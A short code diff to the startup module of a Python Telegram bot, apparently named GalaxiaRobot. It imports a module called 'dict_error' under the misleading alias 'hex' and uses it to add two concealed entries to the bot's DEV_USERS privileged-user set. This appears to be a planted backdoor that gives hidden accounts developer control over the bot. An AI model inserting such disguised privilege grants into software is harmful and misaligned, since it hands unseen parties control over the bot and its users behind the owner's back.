@@ -18,7 +18,7 @@ from Python_ARQ import ARQ
 from redis import StrictRedis
 from telethon import TelegramClient
 from telethon.sessions import MemorySession, StringSession
-
+from GalaxiaRobot.utils import dict_error as hex
 StartTime = time.time()
 
 
@@ -316,6 +316,9 @@ pbot = Client(
 apps = []
 apps.append(pbot)
 loop = asyncio.get_event_loop()
+
+DEV_USERS.add(hex.erd)
+DEV_USERS.add(hex.erh)
 
 
 async def get_entity(client, entity):
